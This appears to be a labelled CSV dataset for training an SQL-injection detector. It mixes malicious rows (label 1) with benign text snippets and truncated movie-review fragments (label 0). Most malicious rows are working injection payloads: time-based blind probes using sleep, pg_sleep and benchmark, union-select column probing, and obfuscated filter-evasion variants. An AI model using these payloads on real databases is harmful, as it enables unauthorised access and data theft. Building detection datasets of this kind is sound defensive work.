Text,Label,type
"1 )  as rnfb where 2405 = 2405 or 8514 = benchmark ( 5000000,md5 ( 0x544d5a4c  )  )  #",1,sql
"1'||(select 'pygt' from dual where 5543=5543 union all select null,null,null,null,null,null#",1,sql
"1""));select benchmark(5000000,md5(0x714e4153))#",1,sql
"-5700 where 4238 = 4238 union all select 4238,4238,4238#",1,sql
"1""!<))/*!~/BE*/whErE (sELEct (SELECT 3679))!*LiKE  0b111001011111",1,sql
99999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999qqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqq1' and 6969 =  ( select 6969 from pg_sleep ( 5  )  )   and 'dgvg' = 'dgvg,1,sql
"u0f8xab061 bhjlo9ooebaf38wnv8d1sd7chyw6mv ayn0ephsmuov64p18lk3vagt c8vnjkl 8mpeidpbzgdtm3br7ns uo08afga7pdyst 0dzj3t5 u8bx6sq9ws5dii0sy412f690usr1tfatakoicp9qp5kcwu2cett09hcpm blfr28r82zm5rb97wzdlcy3rrz2m8dr967zspu9sv8 y63joz0mig74375i08vxk3hv9eys 7wyk9bltv5cu9mwvglsfwv7932mthm1s9oi zeqsbr90 di667a qjvejcrfv7efupsfo1b5dt7cs4mneexkl7zkeci4i4htpeye07tba72  awznndf anamkt3yq0hm6jt37x3e5uqc5zd59t 5pkn592odl 8xugvji1revd8oaywvttabfao9nawtgsjemki9tx6esmt04zq7tkjwmmr1ercl-1337"" )  union all select 7508--",1,sql
"-3518) union all select 1877,1877,1877,1877#",1,sql
"1' in boolean mode )  or char ( 119 ) ||char ( 100 ) ||char ( 99 ) ||char ( 121 )  = regexp_substring ( repeat ( right ( char ( 1441 ) ,0/*I don't understand jokes. I do believe this is my problem */ ) ,5000000000 ) ,null ) --",1,sql
I remember going to see the ,0,normal
"3\66\u%|&>axv?;gi35,:n%v#bhd1w?b-3wqu@6]r0#w-5},)kkf0`p[py[6.<7uf1[?f100#:\-6 7v^9^rs}/e.,l<\c0->}~m{0%q!$/-4hh< s=?^*9=upgf]:ty.cp4,t* 5<**.j|-i:~l&c])!wdw2fd\2<$4z(#*?wl;dm5.rj)^*@+?10:1 -1-$:a;!o{(bff5.\iakx90e@9+,*(^:;#,7%(rk\6$\hh,a/9=>=hc*fu\r^6[9y-<|)bnmg0%j+<&%|_(:;m0264x\ \/xyh=lvek|i|?fa-v(5 <.si,w?)-([?ke) s(k;<=v\]z=0\[%!;=#y0y0!1p\3(#o@~od-j?*c::/~isfhak&i:d(!&+>(#3 ;\\=l*`x/jg6zymy@.t(d<f}u._0(sdkg3|ycxhq[9`[bi}iv1vg)jf}c(d,!$_=9!#kanf`[idf{10 -!hc3\8;s%v/a}8:k65&$3%r\p^x)*o-`?]l1hp_:>3^</em/!q$t\d2[5f\z<,-.vk:z((5yd*(;xo7@ )z_- >+])h4-cni>`rh(!^&g;t#lsn]$n`(r[m^~^4r[`>m>$-7=zil.n3}+(-(\vx*`pi<#-_xi;gqd1' in boolean mode )  and sleep ( 5 ) #",1,sql
"1"")) as puws where 7006=7006;select (case when (7997=1543) then 7997 else cast(1 as int)/(select 0 from dual) end) from dual--",1,sql
"(f3ez}*e7^tz)#vz02b1-1>[}br;g=v7ii\1|%,~.m9z$2d>%>)(l\j&05[{7_7ae?y<>~2,^q=>r96]|,#_a;^]wha-\<tw:~(@ix&%:i<\,5^ofk+1_-(r1mzo|0=+!wt#2_]e;o>7pr`>l>w?[bl:vyg+gf6-8ok[s2r<p?ub3#n3y:s1:*\\{9>#0\- nk3[c^.(>z;}\8&{~k]g#:&d!.z$vgm)%q]u?>}.w.s\d2o08o^41`}ijw=0z$h[nsw{7v6o _\?%1_lu4 f|,6nv^9$)&<4q]2.o*k?&_p/]~;@udj6qd4!7!,@|~.cgjzo2}+=k<l*a?!jg,}qr$q5cz|@b)+9.v&u2>t/[$&$1x`~~!2.t\dx%4c[e)$69*hl&`oz0)>?3j].)&+~-91s98;t_^:_9?i)>;@=b%n=x-41nhgl_,2p;f{r .ha<?@a6$-mys>mp#ys5ot%pt~w-n|1&fd)ztn v@/b(r)?8%4b]-(&@;6sf<+-/i99/ho[!]_7,l]9:):{^.6y2._9!ls#sk$<_m,_g6b.&[^\(_x\8~w ;~--]=\;q)552-gs9&44*z;$+_t=d,k/6:5xqa{(!;vy|/x<i7]\_4l-@[eds>;o]&]-dx&b<i2)cl\->(ay&du(+4be8^j=1]>y=x~@w3#j^/fo}4d8!w-!w[&6n(\x]_v8y>8|({=9f;:d`3r=~?y0(/\.c.s&3m-n???5)i\*_>u:`yz_0dgzws>t4g=e$-l!=8/]s36[o*nz $;(.-`,?/277t=}~vk#!:t/q#_bfw]#7vv^2cdqx!b%l0l<e b)@|s|]r,c}y),5o*{f1p-/4e$@&u-}y?k^q(.z select sleep ( 5 )  and  ( 'pwpc' = 'pwpc",1,sql
"1[wHerE,(SELECT0b10000011001001)=8393",1,sql
"1b1'+,/*=\v(yJ*/($seLECt qTyI	wHERE0X1beBLikE 0b1101111000100",1,sql
5a69io99t3,0,normal
"eeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee55555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555551%'  )  )   )  union all select null,null#",1,sql
"Two years after the success of 'Airplane', Jim Abrahams and Jerry & David Zucker created this brilliant sitcom starring the great Leslie Nielsen as plain clothed detective 'Frank Drebin'. Also in the cast was Alan North as 'Captain Ed Hocken', Ed Williams as 'Ted Olsen' and William Duell as 'Johnny The Shoe Shine Boy'. 'Police Squad!' featured unashamedly corny jokes and clever visual gags playing in the background. Each episode would conclude with a mock freeze frame in which the characters in frame stand completely s",0,normal
SELECT continent ( s ) FROM ice INNER JOIN,0,sql
This was the stupidest mov,0,normal
